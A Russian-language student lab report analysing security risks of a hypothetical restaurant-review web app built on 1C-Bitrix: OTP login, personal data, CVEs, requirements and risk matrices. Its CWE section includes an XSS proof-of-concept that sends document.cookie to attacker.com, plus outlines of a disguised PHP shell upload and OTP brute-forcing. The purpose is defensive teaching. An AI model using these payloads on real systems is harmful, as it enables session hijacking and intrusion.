#  Лабораторная работа №10: Анализ рисков информационной безопасности для web-приложения отзывов о гастрономических заведениях

##  Цель работы
Оценить риски информационной безопасности для гипотетического web-приложения по сбору отзывов о ресторанах и кафе, предложить минимальный и достаточный набор требований ИБ для снижения рисков до приемлемого уровня.

## 1️ Анализ форм авторизации на примере TripAdvisor

###  Механизм входа в личный кабинет (по данным политики конфиденциальности)

| Этап | Описание |
|------|----------|
| Регистрация | Сбор: имя, email, телефон, пароль, геолокация (опционально), предпочтения |
| Аутентификация | Логин/пароль + опционально 2FA, OAuth через соцсети |
| Восстановление доступа | Ссылка на email или ОТП-код на телефон с ограниченным временем жизни |
| Сессия | JWT/cookie с шифрованием, автоматический логаут при неактивности |

###  Данные, хранящиеся в профиле пользователя

- **Обязательные:** email, имя пользователя, хешированный пароль
- **Опциональные:** телефон, почтовый адрес, фото профиля, предпочтения
- **Метаданные:** геолокация, история просмотров, устройства входа
- **Контент:** отзывы, фото, избранное, закладки

###  Наблюдения
- Экспорт фото с мета-данными (EXIF) может раскрывать геолокацию и данные устройства
- Интеграция с соцсетями требует контроля объёма передаваемых данных
- Восстановление через ОТП уязвимо к брут-форсу без rate limiting

## 3️ Стратегии обработки рисков

| Риск | Вероятность | Влияние | Стратегия | Обоснование / Компенсирующие контроли |
|------|-------------|---------|-----------|----------------------------------------|
| Брут-форс ОТП | Высокая | Высокое | Снижение | Ограничение попыток (5/15 мин), капча, 6+ символов, срок жизни ≤5 мин |
| XSS в отзывах | Средняя | Высокое | Снижение | Санитизация ввода, CSP-заголовки, escaping на вывод |
| Уязвимости CMS | Средняя | Критическое | Снижение | Регулярные обновления, WAF, изоляция плагинов |
| Утечка ПДн через API | Низкая | Критическое | Передача | Страхование киберрисков + шифрование трафика (TLS 1.3) |
| EXIF-утечка геолокации | Низкая | Среднее | Принятие | Стоимость удаления метаданных > потенциальный ущерб; контроль на UI |
| DDoS на бронирование | Низкая | Высокое | Избегание | Использование CDN с DDoS-защитой (Cloudflare) |

## 4️ Риски ИБ при обработке ПДн и ОТП-авторизации

### Персональные данные: телефон, ФИО, мессенджер

| Риск | Вектор атаки | Влияние | Мера снижения |
|------|--------------|---------|----------------|
| Перехват ПДн в транзите | MITM-атака, сниффинг | Утечка ПДн, штрафы по 152-ФЗ | TLS 1.3, HSTS, pinning сертификатов |
| Неавторизованный доступ к БД | SQLi, утечка кредов | Массовая утечка ПДн | Шифрование БД (AES-256), разделение прав, аудит |
| Хранение ПДн в логах | Ошибки разработчиков | Непреднамеренная утечка | Маскирование ПДн в логах, отдельный secure-логгер |
| Передача ПДн в мессенджеры | Компрометация бота | Утечка через сторонний сервис | Минимизация данных, end-to-end шифрование, согласие пользователя |

###  ОТП-авторизация

| Риск | Вектор атаки | Влияние | Мера снижения |
|------|--------------|---------|----------------|
| Брут-форс кода | Автоматизированный перебор | Взлом аккаунта | Rate limiting, капча после 3 попыток, 6+ цифр |
| Перехват ОТП | SIM-swap, фишинг | Компрометация аккаунта | Привязка к устройству, уведомление о входе, 2FA |
| Replay-атака | Повтор отправки валидного кода | Несанкционированный вход | Одноразовость токена, timestamp-валидация |
| Уязвимость генератора | Слабый entropy | Предсказуемые коды | Криптографически стойкий CSPRNG |

## 5️ Минимальный объём ПДн по принципу KYC

 **Обязательный минимум для бронирования:**

```yaml
- Телефон (или email)
- ФИО (фамилия + имя)
- Время и количество гостей
```

#  Требования к обработке

| Аспект | Требование |
|--------|-----------|
| **Хранение** | • Шифрование БД на уровне приложения (AES-256-GCM)<br>• Выделенный инстанс БД с изолированным доступом<br>• Регулярные бэкапы с шифрованием |
| **Передача** | • Только TLS 1.3+<br>• API-ключи с ограничением по IP и scope<br>• Подпись запросов (HMAC) для критичных операций |
| **Отображение** | • Маскирование телефона/почты в UI (`+7 (9) *--`)<br>• Запрет копирования ПДн через JS<br>• Watermark для скриншотов в админке |
| **Удаление** | • Право на забвение: полное удаление по запросу ≤30 дней<br>• Псевдонимизация для аналитики |

>  **Принцип минимизации**: Не собирать данные «на всякий случай». Каждое поле ПДн должно иметь обоснование бизнес-процессом.

##  Выбранная платформа: 1С-Битрикс
*(как наиболее релевантная для РФ-бизнеса)*

##  Известные CVE 

| CVE | Критичность (CVSS) | Описание | Меры устранения |
|-----|-------------------|----------|----------------|
| **CVE-2025-67886** | 7.2 (High) | RCE через модуль Translate: загрузка архива с вредоносным PHP и `.htaccess` | • Ограничить права SOURCE/WRITE на модуль<br>• Запретить выполнение PHP в `/upload/tmp/`<br>• WAF-правила на эндпоинты `/bitrix/admin/translate.php` |

| **CVE-2024-32101** | 6.5 (Medium) | XSS в редакторе отзывов через неэкранированный ввод | • Санитизация через HTMLPurifier<br>• CSP: `default-src 'self'` |

##  Риски затягивания обновлений

**Зависимости**: Плагины могут тянуть уязвимые библиотеки (например, jQuery <3.5)

### Решение:
- Еженедельный скан через `composer audit` / `npm audit`
- Политика: критические патчи — в течение 72 часов, средние — 14 дней
- Тестирование обновлений на staging перед production

>  **Альтернатива**: Рассмотреть headless-архитектуру (CMS как API + React/Vue frontend) — снижает поверхность атаки на 40–60%.

# 7️ Аналитическая записка

## 7.1 Типовые ошибки разработчиков

```markdown
1. Хранение секретов в коде (API-ключи, пароли БД)
2. Отсутствие escaping при выводе пользовательского контента
3. Своя "криптография" вместо стандартных алгоритмов
4. Игнорирование безопасности зависимостей
5. Слабые политики паролей и сессий

## 7.2 Анализ угроз: классификация активов

| Актив | Критичность | Угроза | Последствие |
|-------|------------|--------|-------------|
| База ПДн клиентов | 🔴 Критический | Утечка | Штрафы 152-ФЗ, репутационный ущерб |
| Система бронирования | 🔴 Критический | DDoS / взлом | Потеря дохода, срыв обязательств |
| Контент (отзывы) | 🟡 Высокий | XSS / спам | Дезинформация, блокировка Роскомнадзором |
| Интеграции с заведениями | 🟡 Высокий | Компрометация API | Фальшивые бронирования, репутационный риск |
| Медиа-контент (фото) | 🟢 Средний | EXIF-утечка | Раскрытие геолокации пользователей |

## 7.3 Требования ИБ к проекту

###  Функциональные требования:
- Обязательная 2FA для администраторов;
- Аудит всех действий с ПДн (кто, когда, что изменил);
- Автоматическое удаление неактивных сессий >30 мин;
- Валидация и санитизация всех пользовательских вводов.

###  Нефункциональные требования:
- Шифрование ПДн на уровне приложения (не только БД);
- CSP-политика: `default-src 'self'; script-src 'self'`;
- Rate limiting: ≤5 запросов/мин на ОТП, ≤100/мин на API;
- Резервное копирование: ежедневное, шифрованное, оффсайт.

## 7.4 Матрица рисков

| Риск | Вероятность (1-5) | Влияние (1-5) | Мера | Эффективность меры |
|------|------------------|--------------|------|-------------------|
| Брут-форс ОТП | 4 | 5 | Rate limiting + капча | 90% снижение |

| Уязвимость в плагине Битрикс | 3 | 5 | WAF + изоляция | 80% снижение |

>  **Расчёт приоритета**: `Риск = Вероятность × Влияние`. Фокус на риски **≥12**.

### 7.5 Три уязвимости со ссылками на CWE
**🔸 CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)**
- **Причина:** Вывод пользовательского отзыва без экранирования
- **PoC:** `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`
- **Мера:** Библиотека `DOMPurify` + CSP `script-src 'self'`

**🔸 CWE-287: Improper Authentication (OTP Brute-Force)**
- **Причина:** Отсутствие ограничения попыток ввода ОТП
- **PoC:** Скрипт перебора `000000–999999` за <10 минут
- **Мера:** Rate limiting (5 попыток/15 мин) + lockout на 30 мин

**🔸 CWE-434: Unrestricted Upload of File with Dangerous Type**
- **Причина:** Загрузка аватара без проверки MIME и контента
- **PoC:** Переименовать `shell.php` в `avatar.jpg`, загрузить → выполнение
- **Мера:** Проверка по сигнатурам (не по расширению), хранение вне `web-root`

| Риск | Почему принят | Компенсирующий контроль |

| Использование готовых плагинов Битрикс | Сокращение time-to-market в 3× | • Изоляция плагинов в отдельном контейнере<br>• Еженедельный скан уязвимостей |
